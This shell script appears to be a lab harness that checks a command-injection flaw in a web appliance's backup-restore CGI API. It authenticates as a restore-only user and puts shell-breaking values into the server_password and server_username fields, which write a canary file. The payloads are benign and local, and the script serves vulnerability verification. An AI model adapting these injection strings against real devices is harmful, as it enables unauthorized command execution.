#!/bin/sh
set -eu

BASE=http://127.0.0.1:18082/cgi-bin
CANARY=/opt/setup/templates/restore-server-canary
AUTH=
SERVER_PID=

cleanup() {
  set +e
  rm -f "$CANARY" /dev/shm/evobk.lock /dev/shm/server.backup.xweb
  if [ -n "$AUTH" ]; then
    rm -f "/dev/shm/usp_$AUTH"
    rm -rf "/opt/tmp/$AUTH"
  fi
  rm -rf /opt/setup/users/1 /opt/setup/profiles/7
  if [ -n "$SERVER_PID" ]; then
    kill "$SERVER_PID" 2>/dev/null
    wait "$SERVER_PID" 2>/dev/null
  fi
}
trap cleanup EXIT INT TERM

post() {
  /bin/busybox wget -qO- --post-data "$1" "$BASE/api.lua"
}

rm -f "$CANARY" /dev/shm/evobk.lock /dev/shm/server.backup.xweb
mkdir -p /opt/setup/users/1 /opt/setup/profiles/7
cp /lab/fixtures/restore-user-config.json /opt/setup/users/1/config.json
cp /lab/fixtures/restore-profile-config.json /opt/setup/profiles/7/config.json
cp /lab/fixtures/restore-profile-permissions.json /opt/setup/profiles/7/permissions.json
cp /lab/fixtures/restore-profile-layout.json /opt/setup/profiles/7/layout.json
touch /opt/setup/users/1/RestoreOnly /opt/setup/profiles/7/RestoreOnly
if [ "${EVO_DEBUG_CGI:-0}" = 1 ]; then
  /usr/bin/qemu-i386 -L / /usr/bin/lua /opt/xweb/www/cgi-bin/sysinfo.lua
fi
/usr/bin/qemu-i386 -L / /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf -D &
SERVER_PID=$!
for attempt in 1 2 3 4 5 6 7 8 9 10; do
  if /bin/busybox wget -qO- "$BASE/sysinfo.lua" >/dev/null; then
    break
  fi
  sleep 1
done

DENIED=$(post 'action=restore&username=x&password=x&sections=%5B%22data%22%5D&input=server&server_url=http://127.0.0.1:9/unused&server_username=restoreuser&server_password=x%22%3Bprintf%20DENIED_CANARY%20%3E%20/opt/setup/templates/restore-server-canary%3B%23') || true
case "$DENIED" in
  *'"error":"PERMISSION_DENIED"'*) ;;
  *) echo "FAIL no-session control: $DENIED"; exit 1;;
esac
[ ! -e "$CANARY" ] || { echo "FAIL unauthenticated canary executed"; exit 1; }
echo "PASS restore requires authorization"

AUTH_RESPONSE=$(post 'action=authenticate&username=RestoreOnly&password=restoreprobe')
case "$AUTH_RESPONSE" in
  *'"status":"ok"'*'"auth":"SSES'*) ;;
  *) echo "FAIL restore-only authentication: $AUTH_RESPONSE"; exit 1;;
esac
AUTH=${AUTH_RESPONSE#*\"auth\":\"}
AUTH=${AUTH%%\"*}
echo "PASS restore-only authentication"

PASSWORD_RESPONSE=$(post "action=restore&auth=$AUTH&sections=%5B%22data%22%5D&input=server&server_url=http://127.0.0.1:9/unused&server_username=restoreuser&server_password=x%22%3Bprintf%20RESTORE_SERVER_PASSWORD_CANARY%20%3E%20/opt/setup/templates/restore-server-canary%3B%23") || true
echo "password response: $PASSWORD_RESPONSE"
[ "$(cat "$CANARY")" = "RESTORE_SERVER_PASSWORD_CANARY" ] || { echo "FAIL password canary"; exit 1; }
echo "PASS server_password command canary"
rm -f "$CANARY" /dev/shm/server.backup.xweb /dev/shm/evobk.lock

USERNAME_RESPONSE=$(post "action=restore&auth=$AUTH&sections=%5B%22data%22%5D&input=server&server_url=http://127.0.0.1:9/unused&server_username=restoreuser%22%3Bprintf%20RESTORE_SERVER_USERNAME_CANARY%20%3E%20/opt/setup/templates/restore-server-canary%3B%23") || true
echo "username response: $USERNAME_RESPONSE"
[ "$(cat "$CANARY")" = "RESTORE_SERVER_USERNAME_CANARY" ] || { echo "FAIL username canary"; exit 1; }
echo "PASS server_username command canary"
echo "overall: PASS"
